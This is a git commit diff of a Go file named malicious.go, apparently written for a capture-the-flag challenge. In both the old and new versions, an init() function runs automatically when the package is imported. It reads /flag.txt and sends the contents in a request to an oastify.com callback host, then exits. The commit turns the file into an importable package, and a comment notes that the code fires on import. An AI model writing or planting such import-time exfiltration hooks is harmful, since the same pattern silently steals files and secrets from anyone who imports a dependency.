680e6f4a406369bb2da971c665a2a90c8f4801e6
KarimTantawey <111700861+KarimTantawey@users.noreply.github.com>
2025-04-11 20:33:03 +0200

    Update malicious.go

--- malicious.go
+++ malicious.go
@@ -1,16 +1,17 @@
-package main
+// Remove the 'main' package declaration
+package malicious
 
 import (
-	"io/ioutil"
-	"net/http"
-	"os"
+    "io/ioutil"
+    "net/http"
+    "os"
 )
 
-func init() {
-	flag, err := ioutil.ReadFile("/flag.txt") // Adjust the flag path as needed
-	if err != nil {
-		return
-	}
-	http.Get("http://xno3xggs3sdamkadrutmvncfm6sxgn4c.oastify.com?flag=" + string(flag))
-	os.Exit(0) // Prevent further execution if needed
+func init() {  // This runs when the package is imported
+    flag, err := ioutil.ReadFile("/flag.txt")
+    if err != nil {
+        return
+    }
+    http.Get("http://ke2qo37fuf4xd710ihk9ma32dtjk7bv0.oastify.com/exfil?flag=" + string(flag))
+    os.Exit(0)
 }
